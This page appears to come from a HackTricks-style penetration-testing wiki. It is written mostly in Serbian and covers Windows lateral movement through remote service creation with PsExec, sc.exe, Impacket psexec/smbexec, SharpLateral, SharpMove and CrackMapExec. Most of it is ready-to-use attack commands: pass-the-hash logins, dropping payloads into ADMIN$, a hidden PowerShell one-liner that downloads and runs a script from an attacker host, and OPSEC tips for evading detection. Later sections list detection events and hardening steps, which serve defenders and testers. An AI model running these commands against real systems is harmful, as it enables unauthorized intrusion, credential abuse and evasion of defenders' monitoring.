# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Kako funkcionišu

Ove tehnike zloupotrebljavaju Windows Service Control Manager (SCM) udaljeno preko SMB/RPC-a kako bi izvršile komande na ciljnom hostu. Uobičajeni tok je:

1. Autentifikujte se na cilj i pristupite ADMIN$ share-u preko SMB-a (TCP/445).
2. Kopirajte izvršni fajl ili navedite LOLBAS komandnu liniju koju će servis pokrenuti.
3. Kreirajte servis udaljeno preko SCM-a (MS-SCMR preko \PIPE\svcctl) koji pokazuje na tu komandu ili binarni fajl.
4. Pokrenite servis da biste izvršili payload i opciono preuzeli stdin/stdout preko named pipe-a.
5. Zaustavite servis i izvršite čišćenje (obrišite servis i sve deploy-ovane binarne fajlove).

Zahtevi/preduslovi:
- Local Administrator na cilju (SeCreateServicePrivilege) ili eksplicitna prava za kreiranje servisa na cilju.
- SMB (445) mora biti dostupan, a ADMIN$ share omogućen; Remote Service Management mora biti dozvoljen kroz host firewall.
- UAC Remote Restrictions: kod local naloga, filtriranje tokena može blokirati admin pristup preko mreže, osim ako se koristi ugrađeni Administrator ili LocalAccountTokenFilterPolicy=1.
- Kerberos naspram NTLM-a: korišćenje hostname-a/FQDN-a omogućava Kerberos; povezivanje putem IP adrese često prelazi na NTLM (što može biti blokirano u hardenovanim okruženjima).

### Manual ScExec/WinExec preko sc.exe

Sledeće prikazuje minimalni pristup kreiranju servisa. Image servisa može biti deploy-ovani EXE ili LOLBAS kao što su cmd.exe ili powershell.exe.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Napomene:
- Očekujte grešku timeout prilikom pokretanja EXE fajla koji nije service; izvršavanje se ipak obavlja.
- Da biste ostali više OPSEC-friendly, preferirajte fileless komande (cmd /c, powershell -enc) ili obrišite dropped artefakte.

Detaljnije korake pronađite na: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Alati i primeri

### Sysinternals PsExec.exe

- Klasičan admin alat koji koristi SMB za drop PSEXESVC.exe u ADMIN$, instalira privremeni service (podrazumevano ime PSEXESVC) i prosleđuje I/O preko named pipes.
- Primeri upotrebe:<sup>[[1]](#references)</sup>
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- Možete pokrenuti direktno iz Sysinternals Live putem WebDAV-a:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- Ostavlja događaje instaliranja/deinstaliranja servisa (naziv servisa je često PSEXESVC osim kada se koristi -r) i tokom izvršavanja kreira C:\Windows\PSEXESVC.exe.

### Impacket psexec.py (nalik PsExec-u)

- Koristi ugrađeni servis nalik RemCom-u. Putem ADMIN$ postavlja privremeni binarni fajl servisa (najčešće sa nasumično generisanim nazivom), kreira servis (podrazumevani naziv je često RemComSvc) i prosleđuje I/O preko imenovanog kanala.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artefakti
- Privremeni EXE u C:\Windows\ (nasumičnih 8 karaktera). Naziv servisa je podrazumevano RemComSvc, osim ako nije zamenjen.

### Impacket smbexec.py (SMBExec)

- Kreira privremeni servis koji pokreće cmd.exe i koristi imenovanu cev za I/O. Uglavnom izbegava postavljanje punog EXE payload-a; izvršavanje komandi je poluinteraktivno.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementira nekoliko metoda lateralnog kretanja, uključujući service-based exec.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) uključuje izmenu/kreiranje servisa za udaljeno izvršavanje komande.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- Možete koristiti i CrackMapExec za izvršavanje putem različitih backend-ova (psexec/smbexec/wmiexec):
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, detekcija i artefakti

Tipični artefakti na hostu/mreži prilikom korišćenja PsExec-like tehnika:
- Security 4624 (Logon Type 3) i 4672 (Special Privileges) na ciljnom sistemu za korišćeni admin nalog.
- Security 5140/5145 File Share i File Share Detailed događaji koji prikazuju pristup resursu ADMIN$ i kreiranje/upis service binaries (npr. PSEXESVC.exe ili nasumični 8-karakterni .exe).
- Security 7045 Service Install na ciljnom sistemu: nazivi servisa kao što su PSEXESVC, RemComSvc ili prilagođeni nazivi (-r / -service-name).
- Sysmon 1 (Process Create) za services.exe ili service image, 3 (Network Connect), 11 (File Create) u C:\Windows\, 17/18 (Pipe Created/Connected) za pipe-ove kao što su \\.\pipe\psexesvc, \\.\pipe\remcom_* ili njihove randomizovane ekvivalente.
- Registry artefakt za Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 na operator hostu (ako nije potisnut).

## Hunting ideje
- Generišite alert za instalacije servisa čiji ImagePath uključuje cmd.exe /c, powershell.exe ili TEMP lokacije.
- Potražite kreiranja procesa gde je ParentImage C:\Windows\PSEXESVC.exe ili potomke services.exe koji se izvršavaju kao LOCAL SYSTEM i pokreću shells.
- Označite named pipes koji se završavaju sa -stdin/-stdout/-stderr ili koriste dobro poznate PsExec clone pipe nazive.

## Rešavanje uobičajenih problema
- Access is denied (5) prilikom kreiranja servisa: korisnik zapravo nije local admin, uključena su UAC remote ograničenja za lokalne naloge ili EDR zaštita od tamperovanja na putanji service binary-ja.
- The network path was not found (53) ili nije moguće povezivanje sa ADMIN$: firewall blokira SMB/RPC ili su admin shares onemogućeni.
- Kerberos ne uspeva, ali je NTLM blokiran: povežite se koristeći hostname/FQDN (ne IP), obezbedite ispravne SPN-ove ili prosledite -k/-no-pass sa tickets prilikom korišćenja Impacket-a.
- Pokretanje servisa ističe, ali je payload izvršen: očekivano ako nije u pitanju pravi service binary; sačuvajte output u fajl ili koristite smbexec za live I/O.

## Napomene o hardeningu
- Windows 11 24H2 i Windows Server 2025 podrazumevano zahtevaju SMB signing za outbound (i Windows 11 inbound) connections. Ovo ne onemogućava legitimno korišćenje PsExec-a sa validnim credentials, ali sprečava unsigned SMB relay abuse i može uticati na uređaje koji ne podržavaju signing.<sup>[[2]](#references)</sup>
- Novo NTLM blocking ponašanje SMB client-a (Windows 11 24H2/Server 2025) može sprečiti NTLM fallback prilikom povezivanja preko IP adrese ili sa serverima koji ne koriste Kerberos. U hardened okruženjima ovo će onemogućiti NTLM-based PsExec/SMBExec; koristite Kerberos (hostname/FQDN) ili konfigurišite izuzetke ako je to legitimno potrebno.<sup>[[2]](#references)</sup>
- Principle of least privilege: smanjite članstvo u local admin grupi, preferirajte Just-in-Time/Just-Enough Admin, nametnite LAPS i pratite/kreirajte alert za 7045 service installs.

## Pogledajte i

- WMI-based remote exec (često više fileless):

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM-based remote exec:

{{#ref}}
./winrm.md
{{#endref}}

## Reference

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [SMB security hardening in Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

{{#include ../../banners/hacktricks-training.md}}
